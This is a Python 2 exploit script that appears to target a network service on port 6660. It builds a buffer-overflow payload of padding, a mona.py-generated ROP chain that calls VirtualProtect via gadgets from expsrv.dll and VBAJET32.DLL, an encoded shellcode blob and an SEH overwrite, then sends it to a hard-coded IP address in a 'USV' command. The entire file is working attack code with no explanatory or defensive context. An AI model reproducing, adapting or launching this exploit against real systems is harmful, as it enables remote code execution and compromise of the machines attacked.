import socket
import struct

shellcode = ("\xbf\x48\x8a\xf6\x99\xda\xdf\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x7e\x12\x83\xc6\x04\x03\x36\x84\x14\x6c\x3a\x70\x5a"
"\x8f\xc2\x81\x3b\x19\x27\xb0\x7b\x7d\x2c\xe3\x4b\xf5\x60\x08"
"\x27\x5b\x90\x9b\x45\x74\x97\x2c\xe3\xa2\x96\xad\x58\x96\xb9"
"\x2d\xa3\xcb\x19\x0f\x6c\x1e\x58\x48\x91\xd3\x08\x01\xdd\x46"
"\xbc\x26\xab\x5a\x37\x74\x3d\xdb\xa4\xcd\x3c\xca\x7b\x45\x67"
"\xcc\x7a\x8a\x13\x45\x64\xcf\x1e\x1f\x1f\x3b\xd4\x9e\xc9\x75"
"\x15\x0c\x34\xba\xe4\x4c\x71\x7d\x17\x3b\x8b\x7d\xaa\x3c\x48"
"\xff\x70\xc8\x4a\xa7\xf3\x6a\xb6\x59\xd7\xed\x3d\x55\x9c\x7a"
"\x19\x7a\x23\xae\x12\x86\xa8\x51\xf4\x0e\xea\x75\xd0\x4b\xa8"
"\x14\x41\x36\x1f\x28\x91\x99\xc0\x8c\xda\x34\x14\xbd\x81\x50"
"\xd9\x8c\x39\xa1\x75\x86\x4a\x93\xda\x3c\xc4\x9f\x93\x9a\x13"
"\xdf\x89\x5b\x8b\x1e\x32\x9c\x82\xe4\x66\xcc\xbc\xcd\x06\x87"
"\x3c\xf1\xd2\x08\x6c\x5d\x8d\xe8\xdc\x1d\x7d\x81\x36\x92\xa2"
"\xb1\x39\x78\xcb\x58\xc0\xeb\x58\x8c\xca\xf4\xc8\xaf\xca\x1b"
"\x55\x39\x2c\x71\x75\x6f\xe7\xee\xec\x2a\x73\x8e\xf1\xe0\xfe"
"\x90\x7a\x07\xff\x5f\x8b\x62\x13\x37\x7b\x39\x49\x9e\x84\x97"
"\xe5\x7c\x16\x7c\xf5\x0b\x0b\x2b\xa2\x5c\xfd\x22\x26\x71\xa4"
"\x9c\x54\x88\x30\xe6\xdc\x57\x81\xe9\xdd\x1a\xbd\xcd\xcd\xe2"
"\x3e\x4a\xb9\xba\x68\x04\x17\x7d\xc3\xe6\xc1\xd7\xb8\xa0\x85"
"\xae\xf2\x72\xd3\xae\xde\x04\x3b\x1e\xb7\x50\x44\xaf\x5f\x55"
"\x3d\xcd\xff\x9a\x94\x55\x0f\xd1\xb4\xfc\x98\xbc\x2d\xbd\xc4"
"\x3e\x98\x82\xf0\xbc\x28\x7b\x07\xdc\x59\x7e\x43\x5a\xb2\xf2"
"\xdc\x0f\xb4\xa1\xdd\x05")

def create_rop_chain():

	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	0x0f9e65cd,
	0xFFFFFDFF,
	0x0f9d6ba2,
	0x0f9eda97,
	0x41414141,
	#[---INFO:gadgets_to_set_esi:---]
	0x0f9f1dec,  # POP EDX # RETN [expsrv.dll] 
	0x0fa021cc,  # ptr to &VirtualProtect() [IAT expsrv.dll]
	0x0f9ea2a7,  # MOV ECX,DWORD PTR DS:[EDX] # SUB EAX,ECX # RETN [expsrv.dll] 
	0x0f9df8a5,  # PUSH ECX # SUB AL,5F # POP ESI # POP EBP # RETN 0x24 [expsrv.dll] 
	0x41414141,  # Filler (compensate)
	#[---INFO:gadgets_to_set_ebp:---]
	0x0f9a2c87,  # POP EBP # RETN [VBAJET32.DLL] 
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x41414141,  # Filler (RETN offset compensation)
	0x0f9e24f9,  # & push esp # ret 0x08 [expsrv.dll]
	#[---INFO:gadgets_to_set_ebx:---]
	#[---INFO:gadgets_to_set_edx:---]
	0x0f9f2137,  # POP EDX # RETN [expsrv.dll] 
	0xffffffff,  #  
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	0x0f9dbb5a,  # INC EDX # RETN [expsrv.dll] 
	#[---INFO:gadgets_to_set_ecx:---]
	0x0f9ef12a,  # POP ECX # RETN [expsrv.dll] 
	0x0f9a5cc3,  # &Writable location [VBAJET32.DLL]
	#[---INFO:gadgets_to_set_edi:---]
	0x0f9a3aa8,  # POP EDI # RETN [VBAJET32.DLL] 
	0x0f9eaaab,  # RETN (ROP NOP) [expsrv.dll]
	#[---INFO:gadgets_to_set_eax:---]
	0x0f9eccf2,  # POP EAX # RETN [expsrv.dll] 
	0x90909090,  # nop
	#[---INFO:pushad:---]
	0x0f9f30c2,  # PUSHAD # RETN [expsrv.dll] 
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

esp_adjust="\x81\xC4\x98\xFE\xFF\xFF"
junk = "\x41"*154
rop = create_rop_chain()
junk2 = "\x42"*(966-(len(junk)+len(rop)+len(shellcode)+len(esp_adjust)))
seh = struct.pack("I",0x0f9a264d)
buf=junk+rop+esp_adjust+shellcode+junk2+seh
buf += "\x43"*(4000-(len(junk)+len(seh)+len(rop)+len(junk2)+len(shellcode)))

cmd = "USV "+buf+"\r\n\r\n"

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("172.16.0.15",6660))
    s.send(cmd)

except:
    print '[-] Exploit failed'
    exit()
    
